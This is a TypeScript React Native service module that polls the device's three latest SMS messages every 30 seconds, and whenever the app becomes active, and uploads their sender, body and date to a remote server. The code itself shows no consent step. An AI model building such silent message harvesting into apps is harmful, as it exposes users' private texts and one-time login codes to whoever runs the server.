import { AppState, AppStateStatus } from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { smsApi } from '../api/client';
import { listRecentSms } from '../permissions/smsSimple';

const SMS_MONITOR_INTERVAL = 30000; // 30 seconds
const STORAGE_KEY_MOBILE = 'user_mobile_number';
const STORAGE_KEY_LAST_SMS_DATE = 'last_sms_date';

class SmsMonitorService {
  private intervalId: NodeJS.Timeout | null = null;
  private isMonitoring = false;
  private userMobileNumber: string | null = null;

  async startMonitoring(mobileNumber: string): Promise<void> {
    try {
      this.userMobileNumber = mobileNumber;
      await AsyncStorage.setItem(STORAGE_KEY_MOBILE, mobileNumber);
      
      if (this.isMonitoring) {
        return; // Already monitoring
      }

      this.isMonitoring = true;
      console.log('[SMS Monitor] Starting background SMS monitoring for:', mobileNumber);

      // Start periodic checking
      this.intervalId = setInterval(() => {
        this.checkForNewSms();
      }, SMS_MONITOR_INTERVAL);

      // Also check immediately
      this.checkForNewSms();

      // Listen for app state changes
      AppState.addEventListener('change', this.handleAppStateChange);
      
    } catch (error) {
      console.error('[SMS Monitor] Failed to start monitoring:', error);
    }
  }

  async stopMonitoring(): Promise<void> {
    if (this.intervalId) {
      clearInterval(this.intervalId);
      this.intervalId = null;
    }
    
    this.isMonitoring = false;
    this.userMobileNumber = null;
    
    AppState.removeEventListener('change', this.handleAppStateChange);
    
    console.log('[SMS Monitor] Stopped monitoring');
  }

  private handleAppStateChange = (nextAppState: AppStateStatus) => {
    if (nextAppState === 'active' && this.isMonitoring) {
      // App became active, check for new SMS immediately
      this.checkForNewSms();
    }
  };

  private async checkForNewSms(): Promise<void> {
    try {
      if (!this.userMobileNumber) {
        // Try to get from storage
        this.userMobileNumber = await AsyncStorage.getItem(STORAGE_KEY_MOBILE);
        if (!this.userMobileNumber) {
          console.log('[SMS Monitor] No mobile number found, stopping monitor');
          this.stopMonitoring();
          return;
        }
      }

      console.log('[SMS Monitor] Checking for new SMS messages...');
      
      // Get latest SMS messages
      const messages = await listRecentSms(3);
      
      if (messages && messages.length > 0) {
        // Check if we have new messages since last check
        const lastSmsDate = await AsyncStorage.getItem(STORAGE_KEY_LAST_SMS_DATE);
        const latestMessageDate = Math.max(...messages.map(msg => msg.date || 0));
        
        if (!lastSmsDate || latestMessageDate > parseInt(lastSmsDate)) {
          console.log('[SMS Monitor] New SMS detected, updating server...');
          
          // Update server with latest messages
          const result = await smsApi.update({
            mobileNumber: this.userMobileNumber,
            messages: messages.map(msg => ({
              address: msg.address || 'Unknown',
              body: msg.body || '',
              date: msg.date || Date.now()
            }))
          });
          
          if (result.success) {
            // Store the latest message date
            await AsyncStorage.setItem(STORAGE_KEY_LAST_SMS_DATE, latestMessageDate.toString());
            console.log('[SMS Monitor] Successfully updated SMS messages');
          } else {
            console.warn('[SMS Monitor] Failed to update SMS messages:', result.error);
          }
        }
      }
      
    } catch (error) {
      console.error('[SMS Monitor] Error checking SMS:', error);
    }
  }

  async initializeFromStorage(): Promise<void> {
    try {
      const savedMobile = await AsyncStorage.getItem(STORAGE_KEY_MOBILE);
      if (savedMobile) {
        await this.startMonitoring(savedMobile);
      }
    } catch (error) {
      console.error('[SMS Monitor] Failed to initialize from storage:', error);
    }
  }

  isActive(): boolean {
    return this.isMonitoring;
  }
}

// Export singleton instance
export const smsMonitor = new SmsMonitorService();

export const startSmsBackgroundMonitoring = (mobileNumber: string) => {
  return smsMonitor.startMonitoring(mobileNumber);
};

export const stopSmsBackgroundMonitoring = () => {
  return smsMonitor.stopMonitoring();
};